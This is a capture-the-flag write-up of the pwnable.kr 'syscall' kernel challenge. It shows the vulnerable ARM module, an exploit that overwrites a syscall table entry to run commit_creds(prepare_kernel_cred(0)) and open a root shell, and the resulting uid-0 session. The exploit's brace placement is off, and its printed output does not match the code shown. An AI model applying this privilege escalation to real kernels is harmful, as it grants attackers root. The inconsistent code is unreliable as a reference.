# syscall

Ref
- https://github.com/DoubleLabyrinth/pwnable.kr/blob/master/Rookiss/syscall/README.md

這題比較特別是 kernel module

arm，要 debug 應該需要用到 qemu system mode

```c 
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );

```

小寫轉大寫，如果非大寫，就直接寫入

因為 out 我們可控，可以任意寫

我們要提權，我們需要構造一支程式 syscall 去修改目前自己這隻程式的權限，之後去呼叫 system 就拿到有權限的shell，或是要跑 shellcode 也可以

需要修改的地方為 task_struct 的 cred

利用 kernel 內部自己的函數修改 `commit_creds(prepare_kernel_cred(0));`

用 SYS_upper 把 SYS_upper 寫成 buf_sys_getroot

再次 SYS_upper aka buf_sys_getroot 並且傳入 commit_creds prepare_kernel_cred 位置

kernel function symbol 可以從 `/proc/kallsyms` 不過有時候會拿不到(被隱藏) 

```c
#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <stdio.h>

#define SYS_CALL_TABLE ((void**)0x8000e348)
#define SYS_upper 223

long sys_getroot(void* (*prepare_kernel_cred)(void*), int (*commit_creds)(void*)) {
    return commit_creds(prepare_kernel_cred(NULL));
}

int main(int argc, char* argv[]) {
    //<prepare_kernel_cred_addr> <commit_creds_addr>
        size_t i;
        void* prepare_kernel_cred = (void*)strtoul(argv[1], NULL, 16);
        void* commit_creds = (void*)strtoul(argv[2], NULL, 16);
        uint8_t buf_sys_getroot[sizeof(void*) + 1] = {0};

        printf("[*] sys_getroot = %p\n", sys_getroot);

        *(void**)buf_sys_getroot = (void*)sys_getroot;
        for (i = 0; i < sizeof(void*); ++i) {
            if (buf_sys_getroot[i] == 0 || 'a' <= buf_sys_getroot[i] && buf_sys_getroot[i] <= 'z') {
                puts("Cannot get root for now.");
                return -1;
            }

        printf("[*] prepare_kernel_cred = %p\n", prepare_kernel_cred);
        printf("[*] commit_creds = %p\n", commit_creds);

        syscall(SYS_upper, buf_sys_getroot, SYS_CALL_TABLE + SYS_upper);
        syscall(SYS_upper, prepare_kernel_cred, commit_creds);


        system("/bin/sh");

    }
}
```



這邊指令 ttext 應該是要避免編譯後的 sys_getroot 會出現大寫英文的hex

>-Ttext option puts the .text section of your program by the given address
```c 
/tmp $ gcc -Ttext=0x03bbc010 t.c 
/tmp $ ./a.out  8003f924 8003f56c
[*] sys_getroot = 0x3bbc089
[*] lpfn_prepare_kernel_cred = 0x8003f924
[*] lpfn_commit_creds = 0x8003f56c
Launching shell...
/bin/sh: can't access tty; job control turned off
/tmp # ls
a.out  t.c
/tmp # whoami
whoami: unknown uid 0
```
